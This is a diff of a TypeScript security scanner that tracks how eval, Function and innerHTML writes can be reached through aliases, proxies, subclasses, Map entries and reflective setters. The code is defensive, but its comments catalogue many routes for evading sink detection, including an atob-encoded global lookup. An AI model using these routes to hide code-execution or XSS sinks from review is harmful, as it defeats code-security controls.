+        propertyName(callee) === 'next' &&
+        callee.expression !== undefined
+      ) {
+        return [nodeValue(callee.expression)];
+      }
+      // `new Proxy(eval, {})` IS `eval` for every purpose that matters here: a
+      // call on the proxy runs the target unless a handler trap says otherwise,
+      // and a wrapper is the cheapest way to launder a forbidden global.
+      if (isGlobalNamed(target.expression, 'Proxy')) {
+        const wrapped = argumentsOf(target)[0];
+        return wrapped === undefined ? [] : [nodeValue(wrapped)];
+      }
+      return target.expression === undefined ? [] : [resultValue(nodeValue(target.expression))];
+    }
+
+    // A CLASS is its superclass, for the purpose of what constructing it runs.
+    // `class F extends Function {}` inherits `Function`'s constructor, so
+    // `new F('return payload')()` compiles and runs code exactly as the global
+    // does — the subclass changes the spelling, not the sink.
+    if (target.kind === SyntaxKind.ClassDeclaration || target.kind === SyntaxKind.ClassExpression) {
+      const extended: Value[] = [];
+      for (const child of childrenOf(target)) {
+        if (child.kind !== SyntaxKind.HeritageClause) continue;
+        if (child.token !== SyntaxKind.ExtendsKeyword) continue;
+        for (const base of childrenOf(child)) {
+          const from =
+            base.kind === SyntaxKind.ExpressionWithTypeArguments ? base.expression : base;
+          if (from !== undefined) extended.push(nodeValue(from));
+        }
+      }
+      return extended;
+    }
+
+    // `` tag`text` `` INVOKES its tag, so its value is what the tag returns —
+    // the same edge a call has, and the tag is where the callee sits.
+    if (target.kind === SyntaxKind.TaggedTemplateExpression) {
+      return target.tag === undefined ? [] : [resultValue(nodeValue(target.tag))];
+    }
+
+    // A GETTER runs on READ, so `o.run` already IS what the accessor returns —
+    // no call needed.  Reached here because `heldAt` hands back the accessor
+    // itself when a container member is one.
+    if (target.kind === SyntaxKind.GetAccessor) return returnsOf(target).map(nodeValue);
+
+    return [];
+  };
+
+  /**
+   * Every value an expression can hold, following the relation to exhaustion.
+   *
+   * One search serves every question asked of an expression — which globals it
+   * can be, whether it can be a string, what URL prefix it can carry — so those
+   * answers cannot drift apart the way three separate walkers did.
+   */
+  /**
+   * `flowsInto`, memoised on the value's identity.
+   *
+   * The relation is a pure function of the tree, and the same values are asked
+   * about constantly — every call site resolves its callee, and callees repeat.
+   * Recomputing meant re-entering the checker for each one, which is the cost
+   * that matters: symbol resolution, not the walk.
+   */
+  const stepCache = new Map<string, Value[]>();
+  const stepsFrom = (value: Value, key: string): Value[] => {
+    const cached = stepCache.get(key);
+    if (cached !== undefined) return cached;
+    const step = flowsInto(value);
+    // While the call-site map is being built, parameter edges are empty BY
+    // CONSTRUCTION rather than by fact, so those answers must not be kept.
+    if (!buildingCallSites) stepCache.set(key, step);
+    return step;
+  };
+
+  /**
+   * `reaches`, memoised on the starting expression.
+   *
+   * `flowsInto` was already cached, but the SEARCH was not, so every question
+   * asked of an expression re-walked its whole graph.  That was affordable
+   * while the callers were few; once receiver identity became a resolved
+   * question too — asked from inside the relation, for every call — the same
+   * subgraphs were re-explored combinatorially and a repository scan went from
+   * 25 seconds to over ten minutes.
+   */
+  const reachCache = new Map<string, Value[]>();
+
+  const reaches = (node: Syntax | undefined): Value[] => {
+    if (node === undefined) return [];
+    const from = `${node.getStart()}:${node.getEnd()}`;
+    const cached = reachCache.get(from);
+    if (cached !== undefined) return cached;
+    const seen = new Set<string>();
+    const found: Value[] = [];
+    const queue: Value[] = [nodeValue(node)];
+    while (queue.length > 0) {
+      const value = queue.shift() as Value;
+      const key = valueKey(value);
+      if (seen.has(key)) continue;
+      seen.add(key);
+      // The search runs to EXHAUSTION.  Every key is a node range or a global
+      // name, so the space is finite and repetition ends each branch; stopping
+      // early on a count was a bypass, because the padding that reaches the
+      // ceiling is exactly what an attacker controls.
+      if (found.length >= MAX_VALUES) {
+        throw new Error(
+          `sink analysis did not converge in ${filePath} after ${MAX_VALUES} values — ` +
+            'refusing to report this file clean',
+        );
+      }
+      found.push(value);
+      queue.push(...stepsFrom(value, key));
+    }
+    // A search made WHILE the call-site map is being built is deliberately
+    // partial — parameter edges are empty by construction there — so it must
+    // not be kept as the answer for that expression.
+    if (!buildingCallSites) reachCache.set(from, found);
+    return found;
+  };
+
+  /** The GLOBAL NAMES an expression can hold — what a sink spec matches. */
+  const sinkNames = (node: Syntax | undefined): string[] =>
+    reaches(node).flatMap((value) => (value.kind === 'global' ? [value.name] : []));
+
+  /** The EXPRESSIONS an expression can hold — what the value predicates read. */
+  const nodesFrom = (node: Syntax | undefined): Syntax[] =>
+    reaches(node).flatMap((value) => (value.kind === 'node' ? [value.node] : []));
+
+  /**
+   * Whether CALLING a value yields a string.
+   *
+   * `String(x)` is the global; `x.toString()`, `xs.join('')` and
+   * `JSON.stringify(x)` are methods whose result is a string whatever they are
+   * called on, so the property name settles it without resolving a receiver.
+   */
+  const coercesToString = (of: Value): boolean => {
+    if (of.kind === 'global') return of.name === 'String';
+    if (of.kind === 'member') return STRING_COERCIONS.has(of.property);
+    return false;
+  };
+
+  /**
+   * The values a sink's code argument is judged over.
+   *
+   * Expressions, plus a marker for a coercion the relation proved — which has
+   * no node to hand back, and is exactly the case a node-only view missed:
+   * `function w(s) { setTimeout(s(payload), 0) } w(String)` compiles code, and
+   * nothing in the argument's syntax says so.
+   */
+  const codeValues = (node: Syntax | undefined): SinkValue[] =>
+    reaches(node).flatMap<SinkValue>((value) => {
+      if (value.kind === 'node') return [value.node];
+      if (value.kind === 'result' && coercesToString(value.of)) return [COERCED];
+      return [];
+    });
+
+  /** The METHODS-ON-A-RECEIVER an expression can hold — what a member spec matches. */
+  const memberSinks = (node: Syntax | undefined): Array<{ access: Syntax; property: string }> =>
+    reaches(node).flatMap((value) =>
+      value.kind === 'member' ? [{ access: value.access, property: value.property }] : [],
+    );
+
+  /**
+   * Where the CODE argument sits for the way this sink was reached.
+   *
+   * `f(code)` is index 0; `f.call(thisArg, code)` and `f.bind(thisArg, code)`
+   * shift by one; `f.apply(thisArg, [code])` puts it inside an array;
+   * `Reflect.apply(F, thisArg, [code])` does both, and `Reflect.construct(F,
+   * [code])` takes the array one earlier.
+   */
+  const codePosition = (callee: Syntax): CodePosition => {
+    const target = unwrap(callee);
+    if (target === undefined) return { index: 0, inArray: false };
+    // A CALL-shaped callee is an ordinary invocation of whatever it returned —
+    // `const g = () => setTimeout; g()('evil()', 0)` passes its code first.
+    // `Reflect` has its own position rule and never reaches here.
+    if (
+      target.kind === SyntaxKind.PropertyAccessExpression ||
+      target.kind === SyntaxKind.ElementAccessExpression
+    ) {
+      const name = propertyName(target);
+      if (name === 'apply') return { index: 1, inArray: true };
+      if (name === 'call' || name === 'bind') return { index: 1, inArray: false };
+    }
+    return { index: 0, inArray: false };
+  };
+
+  /** The argument expressions a sink's predicate must be tested against. */
+  const codeArguments = (call: Syntax, position: CodePosition, variadic: boolean): Syntax[] => {
+    const args = argumentsOf(call);
+    if (!position.inArray) {
+      const from = args.slice(position.index);
+      return variadic ? from : from.slice(0, 1);
+    }
+    const holder = unwrap(args[position.index]);
+    if (holder?.kind !== SyntaxKind.ArrayLiteralExpression) return [];
+    const elements = childrenOf(holder);
+    return variadic ? elements : elements.slice(0, 1);
+  };
+
+  collectAssignments();
+
+  const newlines = newlineIndex(source);
+  const finding = (node: Syntax, label: string): SinkFinding => ({
+    label,
+    line: lineAt(newlines, node.getStart()),
+    text: source.slice(node.getStart(), node.getEnd()).replace(/\s+/g, ' ').trim().slice(0, 200),
+  });
+
+  /**
+   * Property WRITES a call performs, for the standard reflective setters.
+   *
+   * `node.innerHTML = payload` is one spelling of a write; the platform offers
+   * three more that reach the SAME setter and parse the same HTML —
+   * `Object.assign(node, { innerHTML: payload })`, `Reflect.set(node,
+   * 'innerHTML', payload)` and `Object.defineProperty(node, 'innerHTML', {
+   * value: payload })`.  A scan that recognised only an assignment TARGET saw
+   * none of them, so the most direct XSS write in the language had three
+   * unguarded synonyms.
+   *
+   * These are distinct platform APIs rather than lexical variants of one form,
+   * which is why they are named here: no parse answers "does this invoke a
+   * setter", and the set is closed and small.
+   */
+  const writeCache = new Map<
+    string,
+    Array<{ at: Syntax; property: string; on: Syntax; value?: Syntax }>
+  >();
+  const reflectiveWrites = (
+    call: Syntax,
+  ): Array<{ at: Syntax; property: string; on: Syntax; value?: Syntax }> => {
+    // Memoised: the relation asks this of EVERY call, so recomputing it is the
+    // per-step cost the rule above exists to avoid.
+    const key = `${call.getStart()}:${call.getEnd()}`;
+    const cached = writeCache.get(key);
+    if (cached !== undefined) return cached;
+    writeCache.set(key, []); // cycle guard while this one resolves
+    const found = reflectiveWritesOf(call);
+    writeCache.set(key, found);
+    return found;
+  };
+
+  const reflectiveWritesOf = (
+    call: Syntax,
+  ): Array<{ at: Syntax; property: string; on: Syntax; value?: Syntax }> => {
+    // Resolved through the relation, like the invocation helpers: `const
+    // assign = Object.assign; assign(node, { innerHTML: payload })` reaches the
+    // same setter, and a copy is the cheapest way past a scan matching syntax.
+    const args = argumentsOf(call);
+    const target = args[0];
+    if (target === undefined) return [];
+    const writes: Array<{ at: Syntax; property: string; on: Syntax }> = [];
+    for (const callee of accessesBehind(call.expression)) {
+      const method = propertyName(callee);
+      if (method === undefined) continue;
+      writes.push(...writesVia(method, callee, call, args, target));
+    }
+    return writes;
+  };
+
+  /** The writes ONE resolved setter performs with these arguments. */
+  const writesVia = (
+    method: string,
+    callee: Syntax,
+    call: Syntax,
+    args: readonly Syntax[],
+    target: Syntax,
+  ): Array<{ at: Syntax; property: string; on: Syntax; value?: Syntax }> => {
+    const writes: Array<{ at: Syntax; property: string; on: Syntax; value?: Syntax }> = [];
+    /** Every statically-named member of an object literal. */
+    const members = (
+      source: Syntax | undefined,
+      hop = 0,
+    ): Array<{ at: Syntax; property: string; value?: Syntax }> => {
+      const literal = containerOf(source, hop);
+      if (literal?.kind !== SyntaxKind.ObjectLiteralExpression) return [];
+      const named: Array<{ at: Syntax; property: string; value?: Syntax }> = [];
+      for (const member of childrenOf(literal)) {
+        // A SPREAD contributes the members of whatever it spreads, so
+        // `{ ...{ innerHTML: payload } }` writes the same property the direct
+        // form does — and a spread has no `name`, so it was skipped entirely.
+        if (member.kind === SyntaxKind.SpreadAssignment) {
+          if (hop < MAX_HOPS) named.push(...members(member.expression, hop + 1));
+          continue;
+        }
+        if (member.name === undefined) continue;
+        const property =
+          member.name.kind === SyntaxKind.ComputedPropertyName
+            ? staticPrefix(member.name.expression)
+            : nameOf(member.name);
+        if (property === null || property === undefined) continue;
+        const value =
+          member.kind === SyntaxKind.ShorthandPropertyAssignment ? member.name : member.initializer;
+        named.push(
+          value === undefined ? { at: member, property } : { at: member, property, value },
+        );
+      }
+      return named;
+    };
+
+    // `Object.assign(target, …sources)` — every property of every literal
+    // source.  `Object.defineProperties(target, descriptors)` names its
+    // properties the same way, one level up from `defineProperty`.
+    if (isGlobalNamed(callee.expression, 'Object')) {
+      if (method === 'assign') {
+        for (const source of args.slice(1)) {
+          for (const each of members(source)) writes.push({ ...each, on: target });
+        }
+        return writes;
+      }
+      if (method === 'defineProperties') {
+        // A descriptor map: each member's own `value` is what lands in the slot.
+        for (const each of members(args[1])) {
+          // The descriptor's `value` BY NAME, not by position: a descriptor
+          // that writes `enumerable` or `writable` first put another member at
+          // index 0, and reading that one silently took the wrong expression.
+          const inner =
+            each.value === undefined
+              ? undefined
+              : members(each.value).find((field) => field.property === 'value')?.value;
+          writes.push(
+            inner === undefined
+              ? { at: each.at, property: each.property, on: target }
+              : { at: each.at, property: each.property, on: target, value: inner },
+          );
+        }
+        return writes;
+      }
+    }
+
+    // `Reflect.set(target, key, value)` and `Object.defineProperty(target, key,
+    // descriptor)` both name the property in their SECOND argument.
+    const named =
+      (method === 'set' && isGlobalNamed(callee.expression, 'Reflect')) ||
+      (method === 'defineProperty' && isGlobalNamed(callee.expression, 'Object'));
+    if (!named) return [];
+    const key = args[1];
+    const property = key === undefined ? null : staticPrefix(key);
+    if (property === null) return [];
+    // `Reflect.set` takes the value third; `Object.defineProperty` wraps it in
+    // a descriptor whose own `value` is what the slot receives.
+    const supplied =
+      method === 'set'
+        ? args[2]
+        : args[2] === undefined
+          ? undefined
+          : ((): Syntax | undefined => {
+              const descriptor = unwrap(args[2]);
+              if (descriptor?.kind !== SyntaxKind.ObjectLiteralExpression) return undefined;
+              for (const member of childrenOf(descriptor)) {
+                if (member.name === undefined || nameOf(member.name) !== 'value') continue;
+                return member.initializer;
+              }
+              return undefined;
+            })();
+    return [
+      supplied === undefined
+        ? { at: call, property, on: target }
+        : { at: call, property, on: target, value: supplied },
+    ];
+  };
+
+  /**
+   * Reflective writes, recorded into the SAME container table as `o.run = …`.
+   *
+   * `Object.assign(o, { run: eval })` then `o.run(payload)` runs the global.
+   * The reflective setters were read for member-sink REPORTING only, so the
+   * value they place never reached the slot and laundering a sink through one
+   * of them walked past the relation entirely.
+   *
+   * A second pass because it needs `reflectiveWrites`, which needs the
+   * resolution built above it.
+   */
+  const collectReflectiveWrites = (): void => {
+    for (const node of walk(root)) {
+      if (node.kind !== SyntaxKind.CallExpression && node.kind !== SyntaxKind.NewExpression) {
         continue;
       }
+      // `new Map([['run', eval]])` SEEDS the same slots `.set` fills, so the
+      // constructor's iterable is read into the same table.
+      if (node.kind === SyntaxKind.NewExpression && isGlobalNamed(node.expression, 'Map')) {
+        const seed = containerOf(argumentsOf(node)[0], 0);
+        if (seed?.kind === SyntaxKind.ArrayLiteralExpression) {
+          // Keyed where the READ will look: `m.get('run')` keys on the binding
+          // `m`, so the seed must be recorded against that same declaration
+          // rather than against the `new` expression that produced it.
+          const bound =
+            node.parent?.kind === SyntaxKind.VariableDeclaration ? node.parent.name : undefined;
+          const holder = bound === undefined ? undefined : receiverKey(bound);
+          for (const entry of childrenOf(seed)) {
+            const pair = containerOf(entry, 0);
+            if (pair?.kind !== SyntaxKind.ArrayLiteralExpression) continue;
+            const [key, value] = childrenOf(pair);
+            const named = key === undefined ? null : staticPrefix(key);
+            if (named === null || value === undefined || holder === undefined) continue;
+            const slot = `${holder} ${named}`;
+            written.set(slot, [...(written.get(slot) ?? []), value]);
+          }
+        }
+      }
+      // `m.set('run', eval)` fills a slot exactly as `o.run = eval` does; the
+      // standard collection API is a container with a different spelling, and
+      // reading only property syntax let a sink cross it untouched.
+      const callee = unwrap(node.expression);
+      if (
+        (callee?.kind === SyntaxKind.PropertyAccessExpression ||
+          callee?.kind === SyntaxKind.ElementAccessExpression) &&
+        propertyName(callee) === 'set' &&
+        callee.expression !== undefined
+      ) {
+        const args = argumentsOf(node);
+        const key = args[0] === undefined ? null : staticPrefix(args[0]);
+        const value = args[1];
+        const holder = receiverKey(callee.expression);
+        if (key !== null && value !== undefined && holder !== undefined) {
+          const slot = `${holder} ${key}`;
+          written.set(slot, [...(written.get(slot) ?? []), value]);
+        }
+      }
+      for (const write of reflectiveWrites(node)) {
+        if (write.value === undefined) continue;
+        const key = receiverKey(write.on);
+        if (key === undefined) continue;
+        const slot = `${key} ${write.property}`;
+        written.set(slot, [...(written.get(slot) ?? []), write.value]);
+      }
+    }
+  };
 
-      // `const [run] = [eval]` — the same act, POSITIONALLY. The index is the
-      // property name, so the identical table lookup serves.
-      if (isPunct(tokens[i], '[')) {
-        const close = matchGroup(tokens, i);
-        if (close !== -1 && isPunct(tokens[close], '=')) {
-          const table = receiverAt(unwrapReference(tokens, close + 1));
-          if (table) {
-            arrayElementIndices(tokens, i).forEach((start, index) => {
-              const held = table.get(String(index));
-              const local = tokens[start];
-              if (!held || local?.kind !== 'ident') return;
-              if (held.kind === 'sink') aliases.direct.set(local.value, held.spec);
-              else aliases.members.set(local.value, held.table);
+  /** Where the code argument sits in a `Reflect.apply` / `Reflect.construct`. */
+  const reflectPosition = (call: Syntax): CodePosition => {
+    // Read off the RESOLVED helper: an aliased `Reflect.construct` has an
+    // identifier as its callee, and asking that for a property name returned
+    // nothing — which silently fell back to `apply`'s argument position.
+    for (const callee of accessesBehind(call.expression)) {
+      if (!isGlobalNamed(callee.expression, 'Reflect')) continue;
+      if (propertyName(callee) === 'construct') return { index: 1, inArray: true };
+    }
+    return { index: 2, inArray: true };
+  };
+
+  // After BOTH collectors, so a slot filled reflectively is visible to every
+  // question asked below.
+  collectReflectiveWrites();
+
+  return {
+    sinkNames,
+    memberSinks,
+    codeValues,
+    reflectiveWrites,
+    codePosition,
+    codeArguments,
+    propertyName,
+    reflectTarget,
+    reflectPosition,
+    nodesFrom,
+    finding,
+  };
+}
+
+/**
+ * Find REFERENCES to globals this project may not mention at all.
+ *
+ * THE BOUNDED QUESTION, and the reason it exists.  Everything else in this file
+ * answers "is this sink INVOKED", which is unbounded: a value can reach a call
+ * through a container, a prototype, a proxy, an iterator, a borrowed method,
+ * a coercion — and each shape modelled invites the next, exactly as each regex
+ * once invited the next spelling.  Six review rounds of `Map` seeds,
+ * `Object.create`, `Proxy.revocable` and `Function.prototype.call.call` are
+ * that list restarting one level up: the JavaScript STANDARD LIBRARY, restated
+ * by hand, in a file whose own header describes escaping precisely this trap
+ * for the grammar.
+ *
+ * For `eval` and `Function` the question does not need to be asked.  This
+ * project references them ZERO times in 1284 first-party files, so the rule is
+ * that it never does — the shape `check:no-applause` and `check:no-raw-egress`
+ * already use, and the shape that ENDS a list rather than extending it.  Every
+ * laundering route above still has to name the global somewhere, and naming it
+ * is the violation.
+ *
+ * A reference is a VALUE reference: a type annotation (`fn: Function`) is
+ * erased and means nothing at runtime, a property called `eval` on some object
+ * is not the global, and a local binding that shadows the name is not it
+ * either.  The compiler settles all three.
+ *
+ * WHAT THIS IS NOT.  It is not a defence against an author determined to
+ * evade it — `globalThis[atob('ZXZhbA==')]` defeats any static reading, and
+ * always will.  What stops that is the CSP: `script-src` without
+ * `'unsafe-eval'` plus `require-trusted-types-for 'script'`, enforced by the
+ * browser rather than by a scan, and asserted on the BUILT artifact by
+ * `check:csp-parity`.  This gate is hygiene over first-party source; the
+ * runtime boundary is the control.
+ */
+export function findGlobalReferencesIn(
+  sources: readonly Source[],
+  names: readonly string[],
+): Map<string, SinkFinding[]> {
+  const forbidden = new Set(names);
+  return withParsedSources(sources, (parsed, project) => {
+    const byPath = new Map<string, SinkFinding[]>();
+    for (const { path, content, root } of parsed) {
+      const here = String(root.path);
+      const newlines = newlineIndex(content);
+      const found: SinkFinding[] = [];
+      /**
+       * Whether an expression is a spelling of the GLOBAL OBJECT.
+       *
+       * One bounded hop through a binding, which is all `const g = globalThis`
+       * needs — and all it can need, since the alias itself has to name a
+       * global receiver to exist.
+       */
+      const isGlobalObject = (node: Syntax | undefined, hop = 0): boolean => {
+        if (node?.kind !== SyntaxKind.Identifier || hop > 4) return false;
+        const declaration = project.checker
+          .getSymbolAtPosition(here, node.getStart())
+          ?.declarations.find((each) => String(each.path) === here)
+          ?.resolve(project) as unknown as Syntax | undefined;
+        if (declaration === undefined) {
+          return GLOBAL_RECEIVERS.has(node.text ?? node.getText());
+        }
+        if (declaration.kind !== SyntaxKind.VariableDeclaration) return false;
+        return isGlobalObject(declaration.initializer, hop + 1);
+      };
+
+      for (const node of walk(root)) {
+        // `globalThis.eval` and `self['eval']` name the global through a
+        // PROPERTY, where the identifier is the property half — which the
+        // declaration-name exclusion below was skipping, so the rule had a hole
+        // in exactly the shape it exists to close.  The receiver is resolved
+        // one hop, so `o.eval` on an unrelated object is still not the global.
+        if (
+          node.kind === SyntaxKind.PropertyAccessExpression ||
+          node.kind === SyntaxKind.ElementAccessExpression
+        ) {
+          const named =
+            node.kind === SyntaxKind.PropertyAccessExpression
+              ? node.name === undefined
+                ? undefined
+                : (node.name.text ?? node.name.getText())
+              : (node.argumentExpression?.text ?? undefined);
+          if (named !== undefined && forbidden.has(named) && isGlobalObject(node.expression)) {
+            found.push({
+              label: `reference to the forbidden global \`${named}\``,
+              line: lineAt(newlines, node.getStart()),
+              text: content.slice(node.getStart(), node.getEnd()),
             });
           }
+          continue;
         }
-        continue;
-      }
-
-      const name = tokens[i];
-      if (name?.kind !== 'ident' || specByName.has(name.value)) continue;
-      const previous = tokens[i - 1];
-      if (isPunct(previous, '.') || isPunct(previous, '?.')) continue;
-
-      // `handlers.run = eval` / `handlers[0] = Function` — a sink written INTO
-      // a container that already exists. Building the container empty and
-      // filling it afterwards is the ordinary way a registry is populated, so
-      // reading only the literal left the whole pattern open.
-      //
-      // COPY-ON-WRITE: an existing table may be SHARED (`const g = globalThis`
-      // hands `g` the global sink map itself), so extending it in place would
-      // add the property to every other holder — including the globals.
-      const assigned = readMember(tokens, i + 1);
-      if (assigned) {
-        const at = tokens[assigned.next];
-        const isAssignment = isPunct(at, '=') && !isPunct(tokens[assigned.next + 1], '=');
-        if (isAssignment) {
-          const spec = resolve(unwrapReference(tokens, assigned.next + 1), aliases);
-          if (spec) {
-            const extended = new Map<string, ReceiverEntry>(aliases.members.get(name.value));
-            extended.set(assigned.name, { kind: 'sink', spec });
-            aliases.members.set(name.value, extended);
+        if (node.kind !== SyntaxKind.Identifier) continue;
+        const name = node.text ?? node.getText();
+        if (!forbidden.has(name)) continue;
+        // A NAME being declared is not a reference to the global.
+        if (node.parent?.name?.getStart() === node.getStart()) continue;
+        // A TYPE position is erased at build and runs nothing.  The range is
+        // the compiler's own, so a new type node kind needs no entry here.
+        let inType = false;
+        for (let above = node.parent; above !== undefined; above = above.parent) {
+          if (above.kind >= SyntaxKind.FirstTypeNode && above.kind <= SyntaxKind.LastTypeNode) {
+            inType = true;
+            break;
           }
-          continue;
         }
+        if (inType) continue;
+        // A local binding that shadows the name is not the global.
+        const symbol = project.checker.getSymbolAtPosition(here, node.getStart());
+        if (symbol?.declarations.some((each) => String(each.path) === here) === true) continue;
+        found.push({
+          label: `reference to the forbidden global \`${name}\``,
+          line: lineAt(newlines, node.getStart()),
+          text: content.slice(node.getStart(), node.getEnd()),
+        });
       }
-
-      const declared = initializerIndex(tokens, i);
-      if (declared === null) continue;
-      // `(Function)`, `(0, Function)`, `({ run: eval })` — punctuation around
-      // the initializer, not a different initializer.
-      const initializer = unwrapReference(tokens, declared);
-
-      // The initializer is a RECEIVER — `const o = { run: eval }`,
-      // `const h = [eval]`, or an alias of one (`const g = globalThis`). All
-      // three make `name` an object through which sinks are reachable, and all
-      // three resolve through the one `receiverAt` lookup. An aliased table is
-      // SHARED rather than copied, so an alias of an alias cannot diverge.
-      //
-      // Only a receiver expression taken WHOLE counts. `const e =
-      // globalThis.eval` binds the eval FUNCTION, not the global object, so a
-      // member access or call after the expression disqualifies it and it
-      // falls through to the direct binding below — treating that as a
-      // receiver would have made `e.anything(…)` resolve to a sink.
-      const receiver = receiverAt(initializer);
-      if (receiver) {
-        const after = receiverEnd(initializer);
-        if (!readMember(tokens, after) && !isPunct(tokens[after], '(')) {
-          aliases.members.set(name.value, receiver);
-          continue;
-        }
-      }
-
-      const spec = resolve(initializer, aliases);
-      if (spec) aliases.direct.set(name.value, spec);
+      byPath.set(path, found);
     }
-
-    if (aliases.direct.size + aliases.members.size === before) break;
-  }
-  return aliases;
+    return byPath;
+  });
 }
 
-function analyse(
-  tokens: readonly Token[],
+/**
+ * Find dynamic-code sink INVOCATIONS across many sources, in ONE project.
+ *
+ * Batched because opening a project is the cost that matters: a repository-wide
+ * scan that opened one per file spent three minutes doing it, and the same scan
+ * in a single project is a few seconds.  Every gate that walks a tree of files
+ * should call this rather than the single-source form.
+ */
+export function findSinkInvocationsIn(
+  sources: readonly Source[],
   specs: readonly SinkSpec[],
-  source: string,
-  lineOf: (offset: number) => number,
-): SinkFinding[] {
-  const out: SinkFinding[] = [];
-  const specByName = new Map(specs.map((s) => [s.name, s]));
-  const globalSinkTable = globalReceiverTable(specByName);
-
-  /**
-   * If a sink REFERENCE starts at `i`, return it and the index just past it.
-   * Covers the bare identifier and the global-object forms; the parenthesized
-   * form is handled by the caller, which already knows it is inside a group.
-   */
-  const referenceAt = (i: number, aliases: AliasTable): { spec: SinkSpec; next: number } | null => {
-    const t = tokens[i];
-    if (t?.kind !== 'ident') return null;
-
-    // A RECEIVER: `globalThis.eval`, `self['Function']`, `window?.setTimeout`,
-    // and a user object that was seen holding sinks (`const o = { run: eval }`).
-    const table = GLOBAL_RECEIVERS.has(t.value) ? globalSinkTable : aliases.members.get(t.value);
-    if (table) return descendReceiver(tokens, table, i + 1);
-
-    // The sink itself, or a NAME BOUND TO IT (`const F = Function`).
-    const spec = specByName.get(t.value) ?? aliases.direct.get(t.value);
-    if (!spec) return null;
-    // A bare name preceded by a member access is somebody else's property
-    // (`redis.eval`, `registry.Function`), not the global sink.
-    const prev = tokens[i - 1];
-    if (isPunct(prev, '.') || isPunct(prev, '?.') || isPunct(prev, '#')) return null;
-    return { spec, next: i + 1 };
-  };
-
-  // Aliases are resolved first, so `const F = Function; F('x')()` is caught.
-  const aliasMap = collectAliases(
-    tokens,
-    specByName,
-    (i, known) => referenceAt(i, known)?.spec ?? null,
-  );
-
-  const readReference = (i: number): { spec: SinkSpec; next: number } | null =>
-    referenceAt(i, aliasMap);
-
-  // One invocation, one finding. The same call can now be reached by two
-  // routes — from its rooted reference (`eval.constructor('x')`) and from the
-  // `.constructor` entry point below — so findings are keyed on the sink and
-  // the token index the invocation ENDS at, which is identical for both.
-  const recorded = new Set<string>();
-
-  const record = (spec: SinkSpec, startTok: Token, endIndex: number): void => {
-    const key = `${spec.label}:${endIndex}`;
-    if (recorded.has(key)) return;
-    recorded.add(key);
-    const endTok = tokens[Math.min(endIndex, tokens.length) - 1];
-    const end = endTok ? endTok.end : startTok.end;
-    out.push({
-      label: spec.label,
-      line: lineOf(startTok.start),
-      text: source.slice(startTok.start, end).replace(/\s+/g, ' ').trim(),
-    });
-  };
-
-  /**
-   * From a resolved reference, walk member accesses until a CALL is reached,
-   * then judge the code argument. This is the whole point of the module: any
-   * chain of accesses is consumed structurally, so no spelling of `.call` /
-   * `['call']` / `?.call` needs to be enumerated.
-   */
-  /**
-   * `Function` reached through a property that RESOLVES BACK to it.
-   *
-   * `.prototype` yields `Function.prototype`, whose `.constructor` is
-   * `Function`; and every function's `.constructor` is `Function`, so
-   * `eval.constructor('return 42')()` and `setTimeout.constructor(…)` build
-   * the same object. These are chain CONTINUATIONS, not invocation methods —
-   * treating them as unknown methods stopped the walk and let the call
-   * through.
-   */
-  const functionSpec = specByName.get('Function');
-
-  const walkInvocation = (initial: SinkSpec, refStart: number, afterRef: number): void => {
-    let spec = initial;
-    let j = afterRef;
-    let method: string | undefined;
-    // Guard against a pathological chain; real code never approaches this.
-    for (let steps = 0; steps < 64; steps += 1) {
-      // An OPTIONAL CALL — `f?.(…)` — is a `?.` followed directly by `(`,
-      // which is a call, not a member access.
-      if (isPunct(tokens[j], '?.') && isPunct(tokens[j + 1], '(')) j += 1;
-      // A template tag is a call: Function`return 1`()
-      if (tokens[j]?.kind === 'template') {
-        if (spec.codeArgument === undefined) record(spec, tokens[refStart] as Token, j + 1);
-        return;
-      }
-      if (isPunct(tokens[j], '(')) {
-        const position = codeArgumentIndex(method);
-        if (position === null) return;
-        const end = matchGroup(tokens, j);
-        if (spec.codeArgument === undefined) {
-          record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
-          return;
-        }
-        const candidates = codeArguments(
-          callArguments(tokens, j),
-          position,
-          spec.variadic === true,
-        );
-        if (candidates.some((candidate) => spec.codeArgument?.(candidate) === true))
-          record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
-        return;
-      }
-      const member = readMember(tokens, j);
-      if (!member) return;
-      if (member.name === 'prototype') {
-        // `Function.prototype…` — still the same sink's chain.
-        method = undefined;
-        j = member.next;
-        continue;
-      }
-      if (member.name === 'constructor') {
-        // Any function's `.constructor` IS the Function constructor.
-        if (!functionSpec) return;
-        spec = functionSpec;
-        method = undefined;
-        j = member.next;
-        continue;
-      }
-      method = member.name;
-      j = member.next;
+): Map<string, SinkFinding[]> {
+  return withParsedSources(sources, (parsed, project) => {
+    const byPath = new Map<string, SinkFinding[]>();
+    // Every source in the scan, so a declaration reached ACROSS a module edge
+    // is recognised as local to the batch rather than mistaken for a global.
+    const batch = new Set(parsed.map((each) => String(each.root.path)));
+    for (const { path, content, root } of parsed) {
+      byPath.set(path, invocationsIn(root, project, content, specs, batch));
     }
-  };
+    return byPath;
+  });
+}
 
-  for (let i = 0; i < tokens.length; i += 1) {
-    const t = tokens[i] as Token;
+/** Find dynamic-code sink INVOCATIONS in one source. */
+export function findSinkInvocations(source: string, specs: readonly SinkSpec[]): SinkFinding[] {
+  return findSinkInvocationsIn([{ path: 'scan.ts', content: source }], specs).get('scan.ts') ?? [];
+}
 
-    // `Reflect.apply(sink, thisArg, [code])` / `Reflect.construct(sink, [code])`
-    if (t.kind === 'ident' && t.value === 'Reflect') {
-      const member = readMember(tokens, i + 1);
-      if (member && (member.name === 'apply' || member.name === 'construct')) {
-        let k = member.next;
-        while (isPunct(tokens[k], '?.')) k += 1;
-        if (isPunct(tokens[k], '(')) {
-          const args = callArguments(tokens, k);
-          const first = args[0] ?? [];
-          // The callee argument is itself a reference expression, so it is
-          // resolved with the SAME reader rather than a bespoke pattern.
-          const inner =
-            first.length > 0
-              ? findReferenceIn(first, unwrapReference(first, 0), specByName, aliasMap)
-              : null;
-          if (inner) {
-            const isConstruct = member.name === 'construct';
-            // apply(fn, thisArg, [args]) → args are the 3rd; construct(fn, [args]) → 2nd.
-            const candidates = codeArguments(
-              args,
-              { index: isConstruct ? 1 : 2, inArray: true },
-              inner.variadic === true,
-            );
-            const end = matchGroup(tokens, k);
-            if (
-              inner.codeArgument === undefined ||
-              candidates.some((candidate) => inner.codeArgument?.(candidate) === true)
-            ) {
-              record(inner, t, end === -1 ? k + 1 : end);
+function invocationsIn(
+  root: Syntax,
+  project: Project,
+  source: string,
+  specs: readonly SinkSpec[],
+  batch: ReadonlySet<string>,
+): SinkFinding[] {
+  {
